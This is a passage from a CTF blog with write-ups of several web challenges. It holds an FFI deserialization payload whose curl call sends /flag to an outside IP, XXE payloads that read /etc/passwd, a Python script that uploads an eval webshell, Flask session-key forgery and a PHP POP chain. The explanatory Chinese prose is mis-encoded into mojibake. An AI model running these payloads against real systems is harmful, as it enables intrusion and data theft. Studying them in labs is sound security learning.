class="comment">#?a=$a=unserialize('C%3a1%3a"A"%3a97%3a&#123;a%3a3%3a&#123;s%3a3%3a"ret"%3bN%3bs%3a4%3a"func"%3bs%3a9%3a"FFI%3a%3acdef"%3bs%3a3%3a"arg"%3bs%3a34%3a"int+php_exec(int+type,+char+*cmd)%3b"%3b&#125;&#125;');var_dump($a-&gt;ret-&gt;php_exec(2,'curl%20174.2.6.5:7777/`cat%20/flag`'));</span></span><br></pre></td></tr></table></figure>

<p>buuå†…ç½‘å¼€ä¸€å°é¶æœºç›‘å¬ç«¯å£å°±èƒ½åå¼¹flag</p>
<h3 id="GoogleCTF2019-Quals-Bnv"><a href="#GoogleCTF2019-Quals-Bnv" class="headerlink" title="[GoogleCTF2019 Quals]Bnv"></a>[GoogleCTF2019 Quals]Bnv</h3><p>æ‰«ææ²¡æœ‰ä»»ä½•ä¿¡æ¯ï¼ŒæŠ“åŒ…ï¼Œjsonæ•°æ®æ ¼å¼</p>
<img src="/2020/07/02/taoisms/13.png" class="">

<p>å°è¯•æ³¨å…¥ï¼Œæ²¡æœ‰ä»»ä½•åé¦ˆï¼Œæ€è·¯å¡ä½ï¼Œä»¥ä¸ºä¼šæ˜¯æ¨¡æ¿æ³¨å…¥ï¼Œç„¶è€Œä¹Ÿä¸æ˜¯</p>
<p>çœ‹äº†wpï¼ŒåŸæ¥æ˜¯XXEï¼ŒæŠŠæ•°æ®æ”¹æˆXMLçš„å½¢å¼ä¼ è¿‡å»ï¼ŒæŠ¥é”™</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Validation failed: no DTD found !, line 1, column 9</span><br></pre></td></tr></table></figure>

<p>ç¼ºå°‘dtdå®ä½“ï¼Œé‚£è¿™é¢˜è¦ç”¨xxeçš„dtdå®ä½“æ³¨å…¥æ²¡è·‘äº†ï¼Œè¿™é‡Œè¦æ³¨æ„å¯¹%è¿›è¡Œç¼–ç è½¬æ¢</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">message</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">local_dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///usr/share/yelp/dtd/docbookx.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">ISOamsa</span> <span class="meta-string">'</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &lt;!ENTITY &amp;#x25; file SYSTEM "file:///etc/passwd"&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;"&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string"></span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &amp;#x25;eval;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &amp;#x25;error;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">'</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %local_dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/2020/07/02/taoisms/11.png" class="">

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">    &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;yelp&#x2F;dtd&#x2F;docbookx.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % ISOamsa &#39;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;nonexistent&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line"></span><br><span class="line">        &amp;#x25;eval;</span><br><span class="line">        &amp;#x25;error;</span><br><span class="line">&#39;&gt;</span><br><span class="line">    %local_dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<img src="/2020/07/02/taoisms/12.png" class="">

<p>flagåˆ°æ‰‹</p>
<h3 id="NPUCTF2020-ezinclude"><a href="#NPUCTF2020-ezinclude" class="headerlink" title="[NPUCTF2020]ezinclude"></a>[NPUCTF2020]ezinclude</h3><img src="/2020/07/02/taoisms/14.png" class="">

<p>æœ‰æç¤ºï¼Œéšä¾¿ç»™nameå’Œpassèµ‹å€¼ï¼ŒæŠ“åŒ…</p>
<img src="/2020/07/02/taoisms/15.png" class="">

<p>è¿™é‡Œå¥½åƒæš´éœ²äº†passï¼Œæœ‰ä¸€ç‚¹å°ç–‘é—®ï¼Œæ²¡æœ‰ä¸€å¼€å§‹å°±ç»™äº†æºç ï¼Œåœ¨nameå’Œpasså¯¹äº†ä¹‹åæ‰èƒ½è¯»å–åˆ°æºç </p>
<img src="/2020/07/02/taoisms/16.png" class="">

<p>è®¿é—®flflflflag.phpé¡µé¢ï¼Œå‘ç°ä¼šé‡å®šå‘è·³è½¬ï¼Œç”¨burpè®¿é—®ï¼Œè¯»å–index.php</p>
<img src="/2020/07/02/taoisms/17.png" class="">

<p>æ‰«æç›®å½•æœ‰ä¸€ä¸ªdir.phpï¼Œè®¿é—®ï¼Œåˆ—å‡ºäº†tmpç›®å½•ä¸‹çš„æ–‡ä»¶ä¿¡æ¯</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#dir.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(scandir(<span class="string">'/tmp'</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>åˆ°è¿™é‡Œå¡ä½äº†ï¼Œçœ‹äº†wh1sperå¸ˆå‚…çš„wp</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è¿™é‡Œè€ƒå¯Ÿçš„æ˜¯PHPä¸´æ—¶æ–‡ä»¶åŒ…å«ï¼Œå…¶åŸºæœ¬æ˜¯ä¸¤ç§æƒ…å†µï¼š</span><br><span class="line">åˆ©ç”¨èƒ½è®¿é—®çš„phpinfoé¡µé¢ï¼Œå¯¹å…¶ä¸€æ¬¡å‘é€å¤§é‡æ•°æ®é€ æˆä¸´æ—¶æ–‡ä»¶æ²¡æœ‰åŠæ—¶è¢«åˆ é™¤</span><br><span class="line">PHPç‰ˆæœ¬&lt;7.2ï¼Œåˆ©ç”¨phpå´©æºƒç•™ä¸‹ä¸´æ—¶æ–‡ä»¶</span><br></pre></td></tr></table></figure>

<p>ç½‘ä¸Šæ‰¾çš„exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">charset = string.digits + string.letters</span><br><span class="line">base_url = <span class="string">"http://b432da54-714c-46a4-aa62-1b52953d99f1.node3.buuoj.cn/"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file_to_include</span><span class="params">(url, file_content)</span>:</span></span><br><span class="line">    files = &#123;<span class="string">'file'</span>: (<span class="string">'evil.jpg'</span>, file_content, <span class="string">'image/jpeg'</span>)&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url, files=files)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">print</span> e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_tmp_files</span><span class="params">()</span>:</span></span><br><span class="line">    webshell_content = <span class="string">'&lt;?php eval($_REQUEST[c]);?&gt;'</span>.encode(</span><br><span class="line">        <span class="string">"base64"</span>).strip().encode(<span class="string">"base64"</span>).strip().encode(<span class="string">"base64"</span>).strip()</span><br><span class="line">    file_content = <span class="string">'&lt;?php if(file_put_contents("/tmp/ssh_session_HD89q2", base64_decode("%s")))&#123;echo "flag";&#125;?&gt;'</span> % (</span><br><span class="line">        webshell_content)</span><br><span class="line">    phpinfo_url = <span class="string">"%s/include.php?f=php://filter/string.strip_tags/resource=/etc/passwd"</span> % (</span><br><span class="line">        base_url)</span><br><span class="line">    length = <span class="number">6</span></span><br><span class="line">    times = len(charset) ** (length / <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(times):</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[+] %d / %d"</span> % (i, times)</span><br><span class="line">        upload_file_to_include(phpinfo_url, file_content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    generate_tmp_files()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>è·‘å®Œä¹‹åå†å»è®¿é—®dir.phpï¼ŒæŸ¥çœ‹æ–‡ä»¶åï¼Œåœ¨å»è®¿é—®tmpç›®å½•ä¸‹å¯¹åº”çš„æ–‡ä»¶</p>
<img src="/2020/07/02/taoisms/18.png" class="">

<h3 id="CISCN2019-åä¸œå—èµ›åŒº-Web4"><a href="#CISCN2019-åä¸œå—èµ›åŒº-Web4" class="headerlink" title="[CISCN2019 åä¸œå—èµ›åŒº]Web4"></a>[CISCN2019 åä¸œå—èµ›åŒº]Web4</h3><p>å¼€é¢˜æœ‰ä¸ªç‚¹å‡»é“¾æ¥ï¼Œç‚¹å‡»æ²¡ä»€ä¹ˆååº”ï¼Œä»¥ä¸ºä¼šæ˜¯phpï¼Œä½†æ˜¯ä¸æ˜¯ï¼Œä¼ªåè®®è¯»å–å¤±è´¥</p>
<p>å°è¯•pythonï¼Œæˆäº†ï¼Œæ˜¯flask</p>
<img src="/2020/07/02/taoisms/19.png" class="">

<p>æ•´ç†ä¸€ä¸‹ä»£ç </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8 </span></span><br><span class="line"><span class="keyword">import</span> re, random, uuid, urllib <span class="keyword">from</span> flask </span><br><span class="line"><span class="keyword">import</span> Flask, session, request a</span><br><span class="line">pp = Flask(__name__) </span><br><span class="line">random.seed(uuid.getnode()) //uuid.getnode()è·å–ä¸»æœºMACåœ°å€  <span class="number">02</span>:<span class="number">42</span>:ae:<span class="number">02</span>:<span class="number">08</span>:c5</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = str(random.random()*<span class="number">233</span>) </span><br><span class="line">app.debug = <span class="literal">True</span> @app.route(<span class="string">'/'</span>) </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span> </span><br><span class="line">    session[<span class="string">'username'</span>] = <span class="string">'www-data'</span> </span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Hello World! Read somethings'</span> </span><br><span class="line"><span class="meta">@app.route('/read') </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">()</span>:</span> </span><br><span class="line">    <span class="keyword">try</span>: url = request.args.get(<span class="string">'url'</span>) </span><br><span class="line">    m = re.findall(<span class="string">'^file.*'</span>, url, re.IGNORECASE) </span><br><span class="line">    n = re.findall(<span class="string">'flag'</span>, url, re.IGNORECASE) </span><br><span class="line">    <span class="keyword">if</span> m <span class="keyword">or</span> n: <span class="keyword">return</span> <span class="string">'No Hack'</span> </span><br><span class="line">        res = urllib.urlopen(url) </span><br><span class="line">        <span class="keyword">return</span> res.read() </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> ex: </span><br><span class="line">            <span class="keyword">print</span> str(ex) <span class="keyword">return</span> <span class="string">'no response'</span> @</span><br><span class="line">app.route(<span class="string">'/flag'</span>) </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span><span class="params">()</span>:</span> </span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">and</span> session[<span class="string">'username'</span>] == <span class="string">'fuck'</span>: </span><br><span class="line">        <span class="keyword">return</span> open(<span class="string">'/flag.txt'</span>).read() </span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Access denied'</span> </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>: app.run( debug=<span class="literal">True</span>, host=<span class="string">"0.0.0.0"</span> )</span><br></pre></td></tr></table></figure>

<p>æŸ¥èµ„æ–™linuxçš„macåœ°å€åœ¨sys/class/net/eth0/address ä¸‹ï¼Œè®¿é—®æ‹¿åˆ°macåœ°å€</p>
<p>è¿™é‡Œéœ€è¦æ‹¿åˆ°SECRET_KEY,è®¡ç®—ä¸€ä¸‹ï¼Œè¦ç”¨åˆ°ç§å­</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">random.seed(<span class="number">0x0242ae0208c5</span>)</span><br><span class="line">print(str(random.random()*<span class="number">233</span>))</span><br><span class="line"><span class="comment">#180.33971984089902</span></span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹ä¸€ä¸‹cookieï¼Œç”¨flask_session_managerè§£å¯†ä¸€ä¸‹ï¼Œå†æ”¹æ‰usernameçš„å€¼ï¼Œä»£ç ä¸­/flagè·¯ç”±åªè¦session[â€˜usernameâ€™]==fuckå°±èƒ½æ‹¿åˆ°flag</p>
<img src="/2020/07/02/taoisms/20.png" class="">

<p>è¿™é‡Œå‡ºç‚¹æ„å¤–ï¼Œè®¿é—®/flagï¼Œæ”¹æ‰sessionè¿˜æ˜¯è¢«æ‹’ç»è®¿é—®ï¼Œç£¨äº†ä¸€ä¸ªå°æ—¶ä¸çŸ¥é“å•¥åŸå› ï¼Œflagä¸è¦äº†ï¼Œæ–¹æ³•å­¦åˆ°äº†ï¼Œå‘Šè¾</p>
<h3 id="BSidesCF-2019-SVGMagic"><a href="#BSidesCF-2019-SVGMagic" class="headerlink" title="[BSidesCF 2019]SVGMagic"></a>[BSidesCF 2019]SVGMagic</h3><p>å¼€é¢˜æ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ï¼Œä¸äº†è§£SVGï¼Œå»æœä¸€ä¸‹</p>
<img src="/2020/07/02/taoisms/21.png" class="">

<p>çœ‹åˆ°è¿™é‡Œå°±æ˜ç™½äº†ï¼Œè¦ç”¨xxe</p>
<p>å…ˆå¤§è‡´å­¦äº†ä¸€ä¸‹svgæ–‡ä»¶çš„æ ¼å¼ï¼Œç„¶åå°±å¼€å§‹å†™ä¸€ä¸ªscgæ–‡ä»¶å§ï¼Œxxeè¯»ä¸€ä¸‹/etc/passwd</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt; ]&gt;</span><br><span class="line">&lt;svg height&#x3D;&quot;3000&quot; width&#x3D;&quot;20000&quot;&gt;</span><br><span class="line">  &lt;text x&#x3D;&quot;0&quot; y&#x3D;&quot;15&quot; fill&#x3D;&quot;red&quot;&gt;test &amp;xxe; test&lt;&#x2F;text&gt;</span><br><span class="line">&lt;&#x2F;svg&gt;</span><br></pre></td></tr></table></figure>

<p>æˆåŠŸå›æ˜¾</p>
<img src="/2020/07/02/taoisms/22.png" class="">

<p>ä¸çŸ¥é“è¿™ä¸ªè½½è·è¦æ€ä¹ˆæ”¹æ‰èƒ½è¯»åˆ°flagï¼Œè€Œä¸”flagæ–‡ä»¶åä¹Ÿæ²¡æœ‰å¾—åˆ°</p>
<p>å…¶ä»–å¸ˆå‚…çš„wpæ˜¾ç¤ºï¼Œflagåœ¨flag.txtæ–‡ä»¶ä¸­ï¼Œè½½è·ï¼šfile:./flag.txtæˆ–è€…æ˜¯file:///proc/self/cwd/flag.txt</p>
<p>è¿›ç¨‹å¯ä»¥é€šè¿‡è®¿é—®/proc/self/ç›®å½•æ¥è·å–è‡ªå·±çš„ç³»ç»Ÿä¿¡æ¯ï¼Œé€šè¿‡cwdè·å–å½“å‰ç›®å½•æ¥è¿›å…¥flag.txtæ–‡ä»¶</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;file:.&#x2F;flag.txt&quot;&gt; ]&gt;</span><br><span class="line">&lt;svg height&#x3D;&quot;3000&quot; width&#x3D;&quot;20000&quot;&gt;</span><br><span class="line">  &lt;text x&#x3D;&quot;0&quot; y&#x3D;&quot;15&quot; fill&#x3D;&quot;red&quot;&gt;test &amp;xxe; test&lt;&#x2F;text&gt;</span><br><span class="line">&lt;&#x2F;svg&gt;</span><br></pre></td></tr></table></figure>

<img src="/2020/07/02/taoisms/23.png" class="">

<h3 id="BSidesCF-2019-Pick-Tac-Toe"><a href="#BSidesCF-2019-Pick-Tac-Toe" class="headerlink" title="[BSidesCF 2019]Pick Tac Toe"></a>[BSidesCF 2019]Pick Tac Toe</h3><p>æ‰“å¼€æ˜¯äº•å­—æ£‹ï¼Œä¸‹èµ¢äº†å°±èƒ½æ‹¿åˆ°flag</p>
<p>çœ‹æºç ï¼Œæœ‰æç¤º</p>
<img src="/2020/07/02/taoisms/24.png" class="">

<p>valueå¯¹åº”çš„æ˜¯ä¸‹æ£‹çš„ä½ç½®ï¼Œè¦åœ¨/moveè·¯å¾„ä¸‹ï¼Œé€šè¿‡postçš„å½¢å¼ç»™moveä¼ å€¼</p>
<p>ä¸çŸ¥é“å’‹åšï¼Œå°±å…ˆä¸‹ä¸¤æ­¥ï¼Œæƒ³ç€ä¼šä¸ä¼šèƒ½å¤Ÿç›´æ¥ä¸‹è¢«å µæ­»çš„é‚£ä¸€æ­¥ï¼Œè¯•äº†è¯•å±…ç„¶å¯ä»¥</p>
<img src="/2020/07/02/taoisms/25.png" class="">]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>unserialize</title>
    <url>/2020/05/30/unserialize/</url>
    <content><![CDATA[<p>åºåˆ—åŒ–<a id="more"></a>ä¸phpçš„é­”æœ¯æ–¹æ³•æœ‰å…³ï¼Œåšé¢˜å‰å¯¹é­”æœ¯æ–¹æ³•æ¥ä¸ªå½’çº³</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">__construct()ï¼Œç±»çš„æ„é€ å‡½æ•°</span><br><span class="line">__destruct()ï¼Œç±»çš„ææ„å‡½æ•°</span><br><span class="line">__call()ï¼Œåœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨</span><br><span class="line">__callStatic()ï¼Œç”¨é™æ€æ–¹å¼ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨</span><br><span class="line">__get()ï¼Œè·å¾—ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨</span><br><span class="line">__set()ï¼Œè®¾ç½®ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨</span><br><span class="line">__isset()ï¼Œå½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨<span class="keyword">isset</span>()æˆ–<span class="keyword">empty</span>()æ—¶è°ƒç”¨</span><br><span class="line">__unset()ï¼Œå½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨<span class="keyword">unset</span>()æ—¶è¢«è°ƒç”¨ã€‚</span><br><span class="line">__sleep()ï¼Œæ‰§è¡Œserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°</span><br><span class="line">__wakeup()ï¼Œæ‰§è¡Œunserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°</span><br><span class="line">__toString()ï¼Œç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶çš„å›åº”æ–¹æ³•</span><br><span class="line">__invoke()ï¼Œè°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶çš„å›åº”æ–¹æ³•</span><br><span class="line">__set_state()ï¼Œè°ƒç”¨var_export()å¯¼å‡ºç±»æ—¶ï¼Œæ­¤é™æ€æ–¹æ³•ä¼šè¢«è°ƒç”¨ã€‚</span><br><span class="line">__clone()ï¼Œå½“å¯¹è±¡å¤åˆ¶å®Œæˆæ—¶è°ƒç”¨</span><br><span class="line">__autoload()ï¼Œå°è¯•åŠ è½½æœªå®šä¹‰çš„ç±»</span><br><span class="line">__debugInfo()ï¼Œæ‰“å°æ‰€éœ€è°ƒè¯•ä¿¡æ¯</span><br></pre></td></tr></table></figure>



<h3 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h3><p>å…ˆè´´æºç ï¼Œå†å¥½å¥½åˆ†æ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file=<span class="string">'index.php'</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Welcome to '</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/gopher|http|file|ftp|https|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å•ç‹¬æ¥çœ‹çœ‹å‡ ä¸ªç±»</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è§¦å‘__invoke()é­”æœ¯æ–¹æ³•æ—¶ï¼Œä¼šè°ƒç”¨appendæ–¹æ³•ï¼ŒåŒ…å«$var,æƒ³åŠæ³•åŒ…å«flag.phpæ–‡ä»¶</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file=<span class="string">'index.php'</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Welcome to '</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/gopher|http|file|ftp|https|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åºåˆ—åŒ–å‡½æ•°ä¼šè§¦å‘__wakeup()é­”æœ¯æ–¹æ³•ï¼Œè¿™é‡Œ__wakeup()èƒ½å¤Ÿè§¦å‘__toString()é­”æœ¯æ–¹æ³•ï¼Œè®©strä¸ºTest()ç±»</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æŠŠå¯¹è±¡ä»¥å‡½æ•°çš„å½¢å¼è¿”å›</p>
<p>pop</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Show--__wakeup--toString()--Test--__get()--Modifier--__invoke()</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">	<span class="keyword">protected</span>  $var=<span class="string">"php://filter/read=convert.base64-encode/resource=flag.php"</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;	</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span 